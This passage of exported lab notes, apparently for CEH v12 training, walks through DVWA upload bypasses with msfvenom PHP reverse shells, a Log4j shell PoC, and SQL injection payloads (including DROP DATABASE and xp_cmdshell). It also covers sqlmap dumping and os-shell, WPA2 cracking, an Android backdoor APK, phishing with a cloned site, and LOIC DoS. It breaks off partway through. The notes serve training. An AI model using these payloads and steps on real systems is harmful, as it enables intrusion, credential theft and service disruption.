style="list-style-type:disc"><strong>msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw</strong></li></ul><ul id="119bdadd-c4a7-8072-865e-d46d4f9020c6" class="bulleted-list"><li style="list-style-type:disc">Save to upload.php</li></ul><ul id="119bdadd-c4a7-80be-ad5c-d57827e92e2d" class="bulleted-list"><li style="list-style-type:disc">Upload it and get the URL it was saved<ul id="119bdadd-c4a7-8055-b0d8-e655dc7b06e4" class="bulleted-list"><li style="list-style-type:circle">Here <code><strong>http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php</strong></code></li></ul></li></ul><ul id="119bdadd-c4a7-8089-9c7a-e9df682b95e9" class="bulleted-list"><li style="list-style-type:disc"><code>use exploit/multi/handler</code></li></ul><ul id="119bdadd-c4a7-809f-970c-c3cd8a028591" class="bulleted-list"><li style="list-style-type:disc">Set options: <code><strong>set payload php/meterpreter/reverse_tcp</strong></code><strong>, </strong><code><strong>lhost</strong></code><strong>, </strong><code><strong>lport</strong></code></li></ul><ul id="119bdadd-c4a7-806c-a648-ece051be5d34" class="bulleted-list"><li style="list-style-type:disc">Go to the link <code><strong>http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php</strong></code></li></ul><ul id="119bdadd-c4a7-8027-b9da-de1fcbed01ab" class="bulleted-list"><li style="list-style-type:disc">Meterpreter session should be opened</li></ul></details></li></ul><ul id="119bdadd-c4a7-8031-a2b7-f36c4b869a9f" class="toggle"><li><details open=""><summary>Medium: Front end extension security</summary><ul id="119bdadd-c4a7-8032-a524-e63efb891f3f" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=3333 -f raw</strong></code></li></ul><ul id="119bdadd-c4a7-805e-acac-dfd3a8b718da" class="bulleted-list"><li style="list-style-type:disc">Save it into <code>upload.php.jpg</code></li></ul><ul id="119bdadd-c4a7-8085-b2d2-c9fa8c72116a" class="bulleted-list"><li style="list-style-type:disc">Run burp before uploading</li></ul><ul id="119bdadd-c4a7-80d1-9484-e440a57c95ae" class="bulleted-list"><li style="list-style-type:disc">Upload</li></ul><ul id="119bdadd-c4a7-807c-9b68-e858fb179a24" class="bulleted-list"><li style="list-style-type:disc">Change the request to remove <code>.jpg</code></li></ul><ul id="119bdadd-c4a7-8020-ba0a-c6da652191ed" class="bulleted-list"><li style="list-style-type:disc"><code>use exploit/multi/handler</code></li></ul><ul id="119bdadd-c4a7-8066-87db-fdc557ce468e" class="bulleted-list"><li style="list-style-type:disc">Set options: <code><strong>set payload php/meterpreter/reverse_tcp</strong></code><strong>, </strong><code><strong>lhost</strong></code><strong>, </strong><code><strong>lport</strong></code></li></ul><ul id="119bdadd-c4a7-8091-b9d0-da1406d02ac1" class="bulleted-list"><li style="list-style-type:disc">Go to the link <code><strong>http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php</strong></code></li></ul><ul id="119bdadd-c4a7-8007-98c3-de3a405637f8" class="bulleted-list"><li style="list-style-type:disc">Meterpreter session should be opened</li></ul></details></li></ul><ul id="119bdadd-c4a7-80b8-b240-f7b0f408fb00" class="toggle"><li><details open=""><summary>High: Mime and extension security</summary><ul id="119bdadd-c4a7-8007-9e62-fe44210a27ff" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=2222 -f raw</strong></code></li></ul><ul id="119bdadd-c4a7-80ab-ab29-f98d409a0228" class="bulleted-list"><li style="list-style-type:disc">Save it into <code>upload.jpeg</code> but in the first line write <code>GIF98</code></li></ul><ul id="119bdadd-c4a7-80f6-91ea-daca214e5c41" class="bulleted-list"><li style="list-style-type:disc">Upload it and get the URL</li></ul><ul id="119bdadd-c4a7-80b8-8aea-e64c69881348" class="bulleted-list"><li style="list-style-type:disc">Use command injection to change file extension <code><strong>|copy C:\wamp64\www\DVWA\hackable\uploads\upload.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php</strong></code></li></ul><ul id="119bdadd-c4a7-8021-adfb-d48b64f4c134" class="bulleted-list"><li style="list-style-type:disc"><code>use exploit/multi/handler</code></li></ul><ul id="119bdadd-c4a7-8024-8f2e-df6bb7cf1198" class="bulleted-list"><li style="list-style-type:disc">Set options: <code><strong>set payload php/meterpreter/reverse_tcp</strong></code><strong>, </strong><code><strong>lhost</strong></code><strong>, </strong><code><strong>lport</strong></code></li></ul><ul id="119bdadd-c4a7-8007-8667-f816de505fe3" class="bulleted-list"><li style="list-style-type:disc">Go to the link <code><strong>http://10.10.1.22:8080/dvwa/hackable/uploads/shell.php</strong></code></li></ul></details></li></ul></details></li></ul><ul id="114bdadd-c4a7-801f-99fe-ed5ea89da90f" class="toggle"><li><details open=""><summary>Gain access by exploiting Log4j vulnerability</summary><p id="119bdadd-c4a7-80e7-a165-d5f3e91ff33e" class="">Log4j is an open-source framework that helps developers store various types of logs produced by users.</p><p id="119bdadd-c4a7-80f7-a444-e5d5fdb7ccef" class="">Log4j enables insecure JNDI lookups, when these JNDI lookups are paired with the LDAP protocol, can be exploited to exfiltrate data or execute arbitrary code.</p><p id="119bdadd-c4a7-804a-ba77-dc20681ad66f" class="">Note: This is just a POC, it doesn’t explain how it works</p><p id="11bbdadd-c4a7-807e-887f-c09b97083d66" class="">
</p><ul id="11bbdadd-c4a7-80b8-b34d-dcf62ee1f168" class="toggle"><li><details open=""><summary>Set up a vulnerable machine</summary><ul id="11bbdadd-c4a7-8002-8d2d-cb81c91872d1" class="bulleted-list"><li style="list-style-type:disc"><code>sudo apt-get install docker.io</code></li></ul><ul id="11bbdadd-c4a7-80a7-bd43-d84177e5c310" class="bulleted-list"><li style="list-style-type:disc">Download <a href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></li></ul><ul id="11bbdadd-c4a7-80aa-8401-d0c82e9d2d41" class="bulleted-list"><li style="list-style-type:disc"><code>mkdir log4j-shell-poc</code></li></ul><ul id="11bbdadd-c4a7-80db-bdc5-ca7243a2c81c" class="bulleted-list"><li style="list-style-type:disc"><code>cd log4j-shellpoc</code></li></ul><ul id="11bbdadd-c4a7-8020-a237-ced2226fa8c6" class="bulleted-list"><li style="list-style-type:disc"><code>docker build -t log4j-shell-poc .</code></li></ul><ul id="11bbdadd-c4a7-8041-9a36-f72a466a21f2" class="bulleted-list"><li style="list-style-type:disc"><code>docker run --network host log4j-shell0poc</code></li></ul></details></li></ul><ul id="11bbdadd-c4a7-8057-b26d-e91acaed317e" class="toggle"><li><details open=""><summary>Hack using the attacker machine</summary><ul id="11bbdadd-c4a7-80ea-a7eb-d6e2a01f12dc" class="toggle"><li><details open=""><summary>Setup</summary><ul id="11bbdadd-c4a7-8097-9171-cd8163a441fc" class="bulleted-list"><li style="list-style-type:disc"><code>mkdir log4j-shell-poc</code></li></ul><ul id="11bbdadd-c4a7-80b9-b43e-fa82adaaaf26" class="bulleted-list"><li style="list-style-type:disc"><code>cd log4j-shell-poc</code></li></ul><ul id="11bbdadd-c4a7-8072-b62b-e03d6a4731c0" class="bulleted-list"><li style="list-style-type:disc">Download <code><strong>jdk-8u202-linux-x64.tar.gz</strong></code></li></ul><ul id="11bbdadd-c4a7-8017-a808-d14409ff33d9" class="bulleted-list"><li style="list-style-type:disc"><code><strong>tar -xf jdk-8u202-linux-x64.tar.gz</strong></code></li></ul><ul id="11bbdadd-c4a7-80f5-a52e-f9845b011a4d" class="bulleted-list"><li style="list-style-type:disc"><code>mv </code><code><strong>jdk-8u202-linux-x64.tar.gz /usr/bin</strong></code></li></ul><ul id="11bbdadd-c4a7-8033-8f5e-fd98857c3c88" class="bulleted-list"><li style="list-style-type:disc">Update jdk path in <code>poc.py</code><ul id="11bbdadd-c4a7-80cc-a539-fecd39dc7dd6" class="bulleted-list"><li style="list-style-type:circle">In lines 62, 87, and 99 replace <code><strong>jdk1.8.0_20/bin/java</strong></code> with <code><strong>/usr/bin/jdk1.8.0_202/bin/java</strong></code><code>.</code></li></ul></li></ul></details></li></ul><ul id="11bbdadd-c4a7-8094-8b84-f6e51ae300d1" class="toggle"><li><details open=""><summary>Start listeners</summary><ul id="11bbdadd-c4a7-8048-99dc-e630ceea81f4" class="bulleted-list"><li style="list-style-type:disc">Open a terminal and <code>nc -lvp 9001</code></li></ul><ul id="11bbdadd-c4a7-80ce-90b0-c3d045375e2e" class="bulleted-list"><li style="list-style-type:disc">Open another terminal and <code><strong>python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001</strong></code></li></ul><p id="11bbdadd-c4a7-80cc-8737-f5e1cc270010" class="">
</p></details></li></ul><ul id="11bbdadd-c4a7-801d-8287-dbf9f6caf03c" class="toggle"><li><details open=""><summary>Hack</summary><ul id="11bbdadd-c4a7-80be-baf0-eedab93bb864" class="bulleted-list"><li style="list-style-type:disc">Copy the <code>Send me</code> payload</li></ul><ul id="11bbdadd-c4a7-80e2-af62-ee2c74cd7160" class="bulleted-list"><li style="list-style-type:disc">Go to <code>http://&lt;vulnmachineip&gt;:8080</code></li></ul><ul id="11bbdadd-c4a7-80a4-a48f-c09208cddd78" class="bulleted-list"><li style="list-style-type:disc">Paste the <code>Send me</code> into username and enter a random password</li></ul><ul id="11bbdadd-c4a7-80dd-a34d-c14332943693" class="bulleted-list"><li style="list-style-type:disc">Click <code>Login</code></li></ul><ul id="11bbdadd-c4a7-801d-92e8-e13d610527f4" class="bulleted-list"><li style="list-style-type:disc">The netcat terminal should get a shell</li></ul></details></li></ul></details></li></ul><p id="119bdadd-c4a7-8000-a9d9-f1549d081418" class="">
</p></details></li></ul></details></li></ul></details></li></ul><ul id="111bdadd-c4a7-8061-bacf-f503bbdfafd6" class="toggle"><li><details open=""><summary>Lab 14 - SQL Injection </summary><p id="111bdadd-c4a7-8058-9a96-df55915128d4" class="">There are three main types of SQL injection in terms of approach:</p><ul id="111bdadd-c4a7-8092-9db3-c7efd0c69550" class="bulleted-list"><li style="list-style-type:disc"><strong>In-band SQL injection</strong>: An attacker uses the same communication channel to perform the attack and retrieve the results</li></ul><ul id="111bdadd-c4a7-8015-b05e-ecd5029e2946" class="bulleted-list"><li style="list-style-type:disc"><strong>Blind/inferential SQL injection</strong>: An attacker has no error messages from the system with which to work, but rather simply sends a malicious SQL query to the database</li></ul><ul id="111bdadd-c4a7-808d-8656-dd8ae6c0d440" class="bulleted-list"><li style="list-style-type:disc"><strong>Out-of-band SQL injection</strong>: An attacker uses different communication channels (such as database email functionality, or file writing and loading functions) to perform the attack and obtain the results</li></ul><p id="111bdadd-c4a7-809f-bd5d-c5d570e179b5" class="">
</p><ul id="111bdadd-c4a7-80e0-af22-cc3d4b8c5113" class="toggle"><li><details open=""><summary>Perform SQLi Attacks to MSSQL Databases</summary><ul id="111bdadd-c4a7-8032-b656-fe708e29cf13" class="toggle"><li><details open=""><summary>Perform an SQL injection attack on MSSQL</summary><p id="111bdadd-c4a7-8044-a3fe-e5f3dca8cedc" class="">The example was done on <a href="http://www.goodshopping.com">www.goodshopping.com</a> which has a login field vulnerable to SQLi and is connected to MSSQL DB</p><p id="111bdadd-c4a7-80a7-a1af-feb23264d4d3" class="">Everything below was typed in the login field and the password field was left empty</p><ul id="111bdadd-c4a7-8067-bbae-eb6217d3d184" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>blah&#x27; or 1=1 --</strong></code><ul id="111bdadd-c4a7-8079-b9bc-d888179cb5e5" class="bulleted-list"><li style="list-style-type:circle">Will log in with a user</li></ul></li></ul><ul id="111bdadd-c4a7-8033-a598-d39b14a566de" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>blah&#x27;;insert into login values (&#x27;john&#x27;,&#x27;apple123&#x27;); --</strong></code><ul id="111bdadd-c4a7-80ca-bb08-ca4d893d2886" class="bulleted-list"><li style="list-style-type:circle">Will create a new user</li></ul></li></ul><ul id="111bdadd-c4a7-80ae-9126-e205b6dfde3a" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>blah&#x27;;create database mydatabase; --</strong></code><ul id="111bdadd-c4a7-807c-9690-eb231dfb043b" class="bulleted-list"><li style="list-style-type:circle">Will create a new database</li></ul></li></ul><ul id="111bdadd-c4a7-80d9-a9f4-d2d3c0b6c201" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>blah&#x27;; DROP DATABASE mydatabase; --</strong></code><ul id="111bdadd-c4a7-8020-8ab3-f063374c3fb7" class="bulleted-list"><li style="list-style-type:circle">Will drop the database</li></ul></li></ul><ul id="111bdadd-c4a7-8074-ac48-c8ed0029f45a" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>blah&#x27;;exec master..xp_cmdshell &#x27;ping www.certifiedhacker.com -l 65000 -t&#x27;; --</strong></code><ul id="111bdadd-c4a7-80ae-b23b-f1c424927a21" class="bulleted-list"><li style="list-style-type:circle">Will run ping for alot of time</li></ul><ul id="111bdadd-c4a7-800b-9a8e-d47b79bdfd6b" class="bulleted-list"><li style="list-style-type:circle">Will load the page for alot of time so you know it works</li></ul><ul id="111bdadd-c4a7-80e7-99aa-fb647b186163" class="bulleted-list"><li style="list-style-type:circle">In the backend, you can see ping running in the Details tab of Task Manager</li></ul></li></ul></details></li></ul><ul id="111bdadd-c4a7-8031-8f45-e9bfcf1d73fb" class="toggle"><li><details open=""><summary>Perform an SQLi using sqlmap</summary><p id="111bdadd-c4a7-808a-a3de-fba6c4aedad8" class="">The example is done on page www.moviescope.com</p><p id="111bdadd-c4a7-8042-b4d1-c4c4de59a66f" class="">We first logged in as a user and used <code>document.cookie</code> to get the cookie in the console</p><p id="111bdadd-c4a7-80af-9437-f8dc58db1a93" class="">
</p><ul id="111bdadd-c4a7-809c-8de1-d359b3af8739" class="bulleted-list"><li style="list-style-type:disc">Extract the databases<ul id="111bdadd-c4a7-808c-b7ae-d3f1dcfd3f5d" class="bulleted-list"><li style="list-style-type:circle"><code><strong>sqlmap -u &quot;&lt;target&gt;/whatever.aspx?vulnparam=1&quot; --cookie=&lt;cookie&gt; --dbs</strong></code></li></ul><ul id="111bdadd-c4a7-80cc-9fde-fe9673e822da" class="bulleted-list"><li style="list-style-type:circle">Type <code>Y</code> on prompts</li></ul></li></ul><ul id="111bdadd-c4a7-80ea-96ab-eab637ed33fe" class="bulleted-list"><li style="list-style-type:disc">Extract the tables<ul id="111bdadd-c4a7-80c1-9940-f49dee5fb7cb" class="bulleted-list"><li style="list-style-type:circle"><code><strong>sqlmap -u &quot;&lt;target&gt;/whatever.aspx?vulnparam=1&quot; --cookie=&lt;cookie&gt; -D &lt;database&gt; --tables</strong></code></li></ul></li></ul><ul id="111bdadd-c4a7-80a9-b819-f0c886a124d1" class="bulleted-list"><li style="list-style-type:disc">Dump table data<ul id="111bdadd-c4a7-804b-ab9c-ccd19dd5b3b6" class="bulleted-list"><li style="list-style-type:circle"><code><strong>sqlmap -u &quot;&lt;target&gt;/whatever.aspx?vulnparam=1&quot; --cookie=&lt;cookie&gt; -D &lt;databas&gt;e -T &lt;table&gt; --dump</strong></code></li></ul></li></ul><ul id="111bdadd-c4a7-801e-9011-df52722dd697" class="bulleted-list"><li style="list-style-type:disc">Get a shell<ul id="111bdadd-c4a7-80ad-92e5-feacd089be47" class="bulleted-list"><li style="list-style-type:circle"><code><strong>sqlmap -u &quot;&lt;target&gt;/whatever.aspx?vulnparam=1&quot; --cookie=&lt;cookie&gt; --os-shell</strong></code></li></ul></li></ul></details></li></ul><ul id="111bdadd-c4a7-806a-9a65-f6b29b8c8c48" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="111bdadd-c4a7-8055-aa0e-c6918e29e240" class="bulleted-list"><li style="list-style-type:disc"><strong>Mole</strong> (sourceforge.net)</li></ul><ul id="111bdadd-c4a7-802f-9628-dc73ae7b8c54" class="bulleted-list"><li style="list-style-type:disc"><strong>Blisqy</strong> (github.com)</li></ul><ul id="111bdadd-c4a7-80e1-8302-dff23fec0cae" class="bulleted-list"><li style="list-style-type:disc"><strong>blind-sql-bitshifting</strong> (github.com)</li></ul><ul id="111bdadd-c4a7-803b-a7bf-d861f13ff0f2" class="bulleted-list"><li style="list-style-type:disc"><strong>NoSQLMap</strong> (github.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="111bdadd-c4a7-80f9-bd10-dbd9bc424219" class="toggle"><li><details open=""><summary>Detect SQLi vulnerabilities</summary><ul id="111bdadd-c4a7-80cb-82bf-c6cf80f0514a" class="toggle"><li><details open=""><summary>Detect SQLi using DSSS</summary><ul id="112bdadd-c4a7-80dc-a1e6-d7cc965a13d8" class="bulleted-list"><li style="list-style-type:disc">Get cookie by using <code>document.cookie</code></li></ul><ul id="112bdadd-c4a7-80e1-8dfe-f916f7e73e1e" class="bulleted-list"><li style="list-style-type:disc">Find a url wilth a possibly vulnerable GET parameter<ul id="112bdadd-c4a7-801b-9307-cef0dfcecf8b" class="bulleted-list"><li style="list-style-type:circle">POST might work as well but the lab was with GET</li></ul></li></ul><ul id="112bdadd-c4a7-8017-881b-ca47333ffae7" class="bulleted-list"><li style="list-style-type:disc">Run `<strong>python3 dsss.py -u &quot;http://&lt;url&gt;?exampleparam=1&quot; --cookie=&quot;&lt;cookie&gt;&quot;</strong></li></ul><ul id="112bdadd-c4a7-8041-a312-cf82912db4dc" class="bulleted-list"><li style="list-style-type:disc">Will give you example injection and say if its vulnerable</li></ul></details></li></ul><ul id="111bdadd-c4a7-8002-b0a2-daaae80ce223" class="toggle"><li><details open=""><summary>Detect SQLi using OWASP ZAP</summary><ul id="112bdadd-c4a7-8016-97e2-f122db941524" class="bulleted-list"><li style="list-style-type:disc">Start <code>OWASP ZAP</code></li></ul><ul id="112bdadd-c4a7-80b0-b9c4-f8bbd4bf5708" class="bulleted-list"><li style="list-style-type:disc">On the main screen click the big <code>Automated Scan</code> button</li></ul><ul id="112bdadd-c4a7-8086-ae19-f4ac281b5e23" class="bulleted-list"><li style="list-style-type:disc">Type the website and click <code>Attack</code> with everything on default</li></ul><ul id="112bdadd-c4a7-80bd-893e-f4a0f004e7ac" class="bulleted-list"><li style="list-style-type:disc">Go to the <code>Alerts</code> tab on the bottom and observer vulnerabilities found</li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="112bdadd-c4a7-8001-8e4a-de59a220f4e0" class="toggle"><li><details open=""><summary>Lab 15 - Hacking Wireless Networks</summary><ul id="112bdadd-c4a7-8084-864d-f276adcb94cc" class="toggle"><li><details open=""><summary>Perform wireless traffic analysis</summary><ul id="112bdadd-c4a7-8038-86d9-d8943b0f3994" class="toggle"><li><details open=""><summary>Wi-Fi packet analysis using Wireshark</summary><ul id="112bdadd-c4a7-8051-9815-e0511a5f4579" class="bulleted-list"><li style="list-style-type:disc">Just use Wireshark to look at 802.11 protocol packets</li></ul><ul id="112bdadd-c4a7-80de-9644-fc941fbe47d7" class="bulleted-list"><li style="list-style-type:disc">Other Tools<ul id="112bdadd-c4a7-80e0-8586-d487f37bf750" class="bulleted-list"><li style="list-style-type:circle"><strong>AirMagnet WiFi Analyzer PRO</strong> (netally.com)</li></ul><ul id="112bdadd-c4a7-801c-9d03-e65737155d17" class="bulleted-list"><li style="list-style-type:circle"><strong>SteelCentral Packet Analyzer</strong> (riverbed.com)</li></ul><ul id="112bdadd-c4a7-80ed-aa5e-c535594c8514" class="bulleted-list"><li style="list-style-type:circle"><strong>Omnipeek Network Protocol Analyzer</strong> (liveaction.com)</li></ul><ul id="112bdadd-c4a7-80d5-903a-ec6639e22143" class="bulleted-list"><li style="list-style-type:circle"><strong>CommView for Wi-Fi</strong> (tamos.com)</li></ul><ul id="112bdadd-c4a7-8023-925d-d8d6bd3b900f" class="bulleted-list"><li style="list-style-type:circle"><strong>Capsa Portable Network Analyzer</strong></li></ul></li></ul></details></li></ul></details></li></ul><ul id="112bdadd-c4a7-8069-bf0a-e70496c4483c" class="toggle"><li><details open=""><summary>Perform wireless attacks</summary><ul id="112bdadd-c4a7-8091-9a4f-e469a515c3fc" class="toggle"><li><details open=""><summary>Crack a WEP network using Aircrack-ng</summary><ul id="112bdadd-c4a7-80ee-87ed-cf8e5da5e778" class="bulleted-list"><li style="list-style-type:disc">Create a capture file <code>.cap</code></li></ul><ul id="112bdadd-c4a7-8071-bdd6-cf43d3b5b5c3" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>aircrack-ng &lt;capture file&gt;</strong></code><strong> </strong>to crack it</li></ul></details></li></ul><ul id="112bdadd-c4a7-800f-bcd7-e5da1b7c8036" class="toggle"><li><details open=""><summary>Crack a WPA2 network using Aircrack-ng</summary><ul id="114bdadd-c4a7-8041-a364-fda7f9a6a15e" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>aircrack-ng -a2 -b &lt;target BSSID&gt; -w &lt;wordlist&gt; &lt;.cap file&gt;</strong></code><strong> </strong><ul id="114bdadd-c4a7-80fd-b95e-d4e7a0973102" class="bulleted-list"><li style="list-style-type:circle"><code>-a</code> defines the crack technique, here 2=WPA2</li></ul><ul id="114bdadd-c4a7-80c4-951d-c1351b6f8776" class="bulleted-list"><li style="list-style-type:circle"><code>-b</code> refers to BSSID (MAC address)</li></ul><ul id="114bdadd-c4a7-8045-86c3-e559eba4530f" class="bulleted-list"><li style="list-style-type:circle"><code>-w</code> wordlist</li></ul></li></ul></details></li></ul><ul id="114bdadd-c4a7-8079-a349-f6acda78d404" class="toggle"><li><details open=""><summary>Other Tools to crack WEP/WPA2</summary><ul id="114bdadd-c4a7-805c-ae12-c9b6c2799583" class="bulleted-list"><li style="list-style-type:disc"><strong>Elcomsoft Wireless Security Auditor</strong> (elcomsoft.com)</li></ul><ul id="114bdadd-c4a7-8033-80f9-d6a049115a37" class="bulleted-list"><li style="list-style-type:disc"><strong>Portable Penetrator</strong> (secpoint.com)</li></ul><ul id="114bdadd-c4a7-80e8-bb40-c7e08cc1ba0e" class="bulleted-list"><li style="list-style-type:disc"><strong>WepCrackGui</strong> (sourceforge.net)</li></ul><ul id="114bdadd-c4a7-804c-9e2c-cf2c22a86d1b" class="bulleted-list"><li style="list-style-type:disc"><strong>Pyrit</strong> (github.com),</li></ul><ul id="114bdadd-c4a7-8018-8d00-fc33ba400a71" class="bulleted-list"><li style="list-style-type:disc"><strong>WepAttack</strong> (wepattack.sourceforge.net)<br/><br/><br/></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="11bbdadd-c4a7-8066-ac41-f80251d5e213" class="toggle"><li><details open=""><summary>Lab 16 - Hacking Mobile Platforms</summary><ul id="11bbdadd-c4a7-80a5-8930-c100ba60f66d" class="toggle"><li><details open=""><summary>Hack android devices</summary><ul id="128bdadd-c4a7-800e-91c1-c8323c7b7caf" class="toggle"><li><details open=""><summary>General</summary><p id="128bdadd-c4a7-806e-b80e-e9a524362b37" class="">Android has a stack of software components categorized into six sections <div class="indented"><ul id="128bdadd-c4a7-8055-8611-d816232dbaa7" class="bulleted-list"><li style="list-style-type:disc">System Apps, Java AP Framework</li></ul><ul id="128bdadd-c4a7-8016-93cc-fb6eb057938b" class="bulleted-list"><li style="list-style-type:disc">Native C/C++ Libraries, Android Runtime</li></ul><ul id="128bdadd-c4a7-8049-9671-ed1989caa678" class="bulleted-list"><li style="list-style-type:disc">Hardware Abstraction Layer [HAL], and Linux kernel) and five layers</li></ul></div></p></details></li></ul><ul id="11bbdadd-c4a7-80bd-83ee-d19f407c08e5" class="toggle"><li><details open=""><summary>Hack an Android device by creating binary payloads using Parrot Security</summary><ul id="128bdadd-c4a7-8091-a7ab-c5ef8cfab832" class="bulleted-list"><li style="list-style-type:disc">Create the payload<ul id="128bdadd-c4a7-80aa-91de-dd44d8815b7a" class="bulleted-list"><li style="list-style-type:circle"><code><strong>msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=&lt;attacker ip&gt; R &gt; Desktop/Backdoor.apk</strong></code></li></ul></li></ul><ul id="128bdadd-c4a7-8043-abeb-cf749372c1a6" class="bulleted-list"><li style="list-style-type:disc">Upload it to target<ul id="128bdadd-c4a7-809a-adb2-cd5918396bd2" class="bulleted-list"><li style="list-style-type:circle"><code>python -m http.server</code></li></ul></li></ul><ul id="128bdadd-c4a7-8072-8de9-ffaf341b7a98" class="bulleted-list"><li style="list-style-type:disc">Run multi handler<ul id="128bdadd-c4a7-8032-af7d-ce2cb2b594f0" class="bulleted-list"><li style="list-style-type:circle"><code><strong>use exploit/multi/handler</strong></code></li></ul><ul id="128bdadd-c4a7-80cd-81a4-d440bd25ce64" class="bulleted-list"><li style="list-style-type:circle"><code><strong>set payload android/meterpreter/reverse_tcp</strong></code></li></ul><ul id="128bdadd-c4a7-80da-9c75-e6bad02aa748" class="bulleted-list"><li style="list-style-type:circle"><code><strong>set LHOST &lt;attacker ip&gt;</strong></code><strong> </strong></li></ul><ul id="128bdadd-c4a7-8022-97c8-ed818b09b565" class="bulleted-list"><li style="list-style-type:circle"><code>exploit -j -z</code> This runs and sets as background</li></ul></li></ul><ul id="128bdadd-c4a7-809c-8744-d6f07589eba5" class="bulleted-list"><li style="list-style-type:disc">Run the exploit on target</li></ul><ul id="128bdadd-c4a7-8084-9064-ffa07e8f3582" class="bulleted-list"><li style="list-style-type:disc"><code>sessions -i 1</code></li></ul><ul id="128bdadd-c4a7-8008-9d47-c876c25112ab" class="bulleted-list"><li style="list-style-type:disc">…..</li></ul><ul id="128bdadd-c4a7-80ed-8a9c-c05e306d6ec1" class="bulleted-list"><li style="list-style-type:disc">Profit!</li></ul><ul id="128bdadd-c4a7-8061-9220-e3c2745fb5a2" class="bulleted-list"><li style="list-style-type:disc">Things you can do after getting a session<ul id="128bdadd-c4a7-802d-8640-cef9a076fd4a" class="bulleted-list"><li style="list-style-type:circle"><code>sysinfo</code></li></ul><ul id="128bdadd-c4a7-809e-8cdd-d70627803bf9" class="bulleted-list"><li style="list-style-type:circle"><code>ipconfig</code></li></ul><ul id="128bdadd-c4a7-809c-a45f-cf764cedd522" class="bulleted-list"><li style="list-style-type:circle"><code>pwd</code></li></ul><ul id="128bdadd-c4a7-805f-999e-c49b52eb51bd" class="bulleted-list"><li style="list-style-type:circle"><code>ps</code></li></ul></li></ul></details></li></ul><ul id="11bbdadd-c4a7-80e4-b467-df745ca4ca36" class="toggle"><li><details open=""><summary>Harvest users’ credentials using the Social-Engineer Toolkit</summary><p id="128bdadd-c4a7-808f-86cf-e9a8637d4ee7" class="">Here, we set up a cloned website and attempt to capture credentials</p><p id="128bdadd-c4a7-808d-b199-ca1d4b660948" class="">
</p><ul id="128bdadd-c4a7-80c8-8e60-febd8e60507d" class="bulleted-list"><li style="list-style-type:disc">Install <a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a> and run</li></ul><ul id="128bdadd-c4a7-8012-8033-d3270fac65e1" class="bulleted-list"><li style="list-style-type:disc">Select <code>1) Social engineering Attacks</code></li></ul><ul id="128bdadd-c4a7-8086-8393-c6c81909bd52" class="bulleted-list"><li style="list-style-type:disc">Select <code>2) Website Attack Vectors</code></li></ul><ul id="128bdadd-c4a7-8048-bc15-cdc72baae853" class="bulleted-list"><li style="list-style-type:disc">Select <code>3) Credential Harvester Attack Method</code></li></ul><ul id="128bdadd-c4a7-801f-8b52-e944993db3f7" class="bulleted-list"><li style="list-style-type:disc">Select <code>2) Site Cloner</code></li></ul><ul id="128bdadd-c4a7-80a5-adac-e9e37f9a5616" class="bulleted-list"><li style="list-style-type:disc">Type the IP address of your Attacker Machine</li></ul><ul id="128bdadd-c4a7-80e8-84e1-e6366a994c5b" class="bulleted-list"><li style="list-style-type:disc">Type in the option <code>Enter url to clone</code> <ul id="128bdadd-c4a7-8008-8339-fdc27d0d4e48" class="bulleted-list"><li style="list-style-type:circle">here we used <strong>http://certifiedhacker.com/Online%20Booking/index.htm</strong></li></ul></li></ul><ul id="128bdadd-c4a7-8073-9699-e6eb27b9dd2d" class="bulleted-list"><li style="list-style-type:disc">Type <code>y</code> if it prompts to disable apache</li></ul><ul id="128bdadd-c4a7-80e3-aa0d-ca14324b0600" class="bulleted-list"><li style="list-style-type:disc">Send it via email to the victim<ul id="128bdadd-c4a7-80fc-94b9-c2abf53a6720" class="bulleted-list"><li style="list-style-type:circle">Hide the address by writing a link and hyperlinking it to another link</li></ul></li></ul><ul id="128bdadd-c4a7-8060-ab16-f8ef4f51aeca" class="bulleted-list"><li style="list-style-type:disc">Let them take the bait and input credentials</li></ul></details></li></ul><ul id="11bbdadd-c4a7-8010-b565-fb6abe107dd2" class="toggle"><li><details open=""><summary>Launch a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform</summary><ul id="128bdadd-c4a7-80ab-9e81-c092140ee2ea" class="bulleted-list"><li style="list-style-type:disc">Install <code>Low Orbit Cannon</code> apk  from <code><strong>CEHv12 Module 17 Hacking Mobile Platforms</strong></code><code> --&gt; </code><code><strong>Android Hacking Tools</strong></code></li></ul><ul id="128bdadd-c4a7-8066-8edd-c153463efc34" class="bulleted-list"><li style="list-style-type:disc">Run with this config<ul id="128bdadd-c4a7-80b8-b27e-e7d2018e3d90" class="bulleted-list"><li style="list-style-type:circle">Set <code>IP Address</code> of victim</li></ul><ul id="128bdadd-c4a7-8052-8dcf-d35a299b1c53" class="bulleted-list"><li style="list-style-type:circle">Click <code>GET IP</code></li></ul><ul id="128bdadd-c4a7-80c1-8a61-c49eb4f92ac6" class="bulleted-list"><li style="list-style-type:circle">Set port to 80</li></ul><ul id="128bdadd-c4a7-802f-b966-d68ec8a6d044" class="bulleted-list"><li style="list-style-type:circle">Set radio button to TCP</li></ul><ul id="128bdadd-c4a7-804c-b55d-f647b500d7ba" class="bulleted-list"><li style="list-style-type:circle">Set threads to 